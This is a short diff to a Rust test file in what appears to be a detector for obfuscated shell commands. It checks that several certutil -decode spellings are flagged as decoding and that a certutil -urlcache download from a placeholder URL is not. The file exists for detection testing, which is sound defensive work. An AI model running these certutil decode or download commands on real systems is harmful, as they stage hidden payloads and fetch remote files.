@@ -598,6 +598,17 @@ fn every_decode_is_a_zero_point_timeline_mark() {
             "chain.shell_encoded_payload"
         ]
     );
+    // Every certutil spelling that scores as a decode also marks it.
+    assert_matches(
+        "obfuscation.decode",
+        "command",
+        &[
+            "certutil -decode documented.b64 documented.cer",
+            "certutil.exe -decode documented.b64 documented.cer",
+            "certutil -f /decode documented.b64 documented.cer",
+        ],
+        &["certutil -urlcache -split -f https://example.invalid/a a"],
+    );
 }
 
 #[test]
